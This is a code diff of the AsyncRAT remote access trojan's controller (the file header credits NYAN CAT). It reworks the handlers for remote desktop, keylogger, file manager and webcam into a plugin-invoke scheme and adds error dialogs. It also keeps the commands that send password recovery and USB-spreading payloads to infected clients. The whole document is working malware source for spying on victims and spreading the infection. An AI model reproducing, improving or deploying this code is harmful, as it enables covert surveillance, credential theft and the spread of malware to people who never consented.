@@ -16,6 +16,7 @@ using Server.Handle_Packet;
 using Server.Helper;
 using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
+using System.Text;
 
 /* 
        │ Author       : NYAN CAT
@@ -617,20 +618,19 @@ namespace Server
 
         private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count > 0)
+             if (listView1.SelectedItems.Count > 0)
             {
                 try
                 {
-                    //DLL Plugin
-                    //msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    //msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginDesktop);
                     MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    msgpack.ForcePathObject("Option").AsString = "capture";
-                    msgpack.ForcePathObject("Quality").AsInteger = 30;
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Command").AsString = "invoke";
+                    msgpack.ForcePathObject("Hash").AsString = Methods.GetHash(Path.Combine(Application.StartupPath, "Plugin", "PluginDesktop.dll"));
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
+                        msgpack.ForcePathObject("Host").AsString = client.TcpClient.LocalEndPoint.ToString().Split(':')[0];
+                        msgpack.ForcePathObject("Port").AsString = client.TcpClient.LocalEndPoint.ToString().Split(':')[1];
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
                             FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
@@ -650,7 +650,11 @@ namespace Server
                         }));
                     }
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
             }
         }
 
@@ -661,8 +665,9 @@ namespace Server
                 if (listView1.SelectedItems.Count > 0)
                 {
                     MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
-                    msgpack.ForcePathObject("isON").AsString = "true";
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Command").AsString = "invoke";
+                    msgpack.ForcePathObject("Hash").AsString = Methods.GetHash(Path.Combine(Application.StartupPath, "Plugin", "LimeLogger.dll"));
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
@@ -675,8 +680,7 @@ namespace Server
                                 {
                                     Name = "keyLogger:" + client.ID,
                                     Text = "keyLogger:" + client.ID,
-                                    F = this,
-                                    Client = client
+                                    F = this
                                 };
                                 KL.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -707,7 +711,7 @@ namespace Server
                                     Name = "chat:" + client.ID,
                                     Text = "chat:" + client.ID,
                                     F = this,
-                                    Client = client
+                                    ParentClient = client
                                 };
                                 shell.Show();
                             }
@@ -725,8 +729,9 @@ namespace Server
                 if (listView1.SelectedItems.Count > 0)
                 {
                     MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Command").AsString = "invoke";
+                    msgpack.ForcePathObject("Hash").AsString = Methods.GetHash(Path.Combine(Application.StartupPath, "Plugin", "PluginFileManager.dll"));
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
@@ -740,8 +745,8 @@ namespace Server
                                     Name = "fileManager:" + client.ID,
                                     Text = "fileManager:" + client.ID,
                                     F = this,
-                                    Client = client,
-                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
+                                    ParentClient = client,
+                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "FileManager")
                                 };
                                 fileManager.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -750,7 +755,11 @@ namespace Server
                     }
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
         }
 
         private void PasswordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
@@ -771,7 +780,11 @@ namespace Server
                     new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
                     tabControl1.SelectedIndex = 1;
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
             }
         }
 
@@ -836,7 +849,7 @@ namespace Server
                 try
                 {
                     MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "usbSpread";
+                    msgpack.ForcePathObject("Packet").AsString = "usb";
                     msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginUsbSpread);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
@@ -846,7 +859,11 @@ namespace Server
                     new HandleLogs().Addmsg("Sending USB Spread..", Color.Black);
                     tabControl1.SelectedIndex = 1;
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
             }
         }
 
@@ -1259,8 +1276,9 @@ namespace Server
                 try
                 {
                     MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "webcam";
-                    msgpack.ForcePathObject("Command").AsString = "getWebcams";
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Command").AsString = "invoke";
+                    msgpack.ForcePathObject("Hash").AsString = Methods.GetHash(Path.Combine(Application.StartupPath, "Plugin", "PluginCam.dll"));
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
@@ -1283,7 +1301,11 @@ namespace Server
                         }));
                     }
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
             }
         }
     }
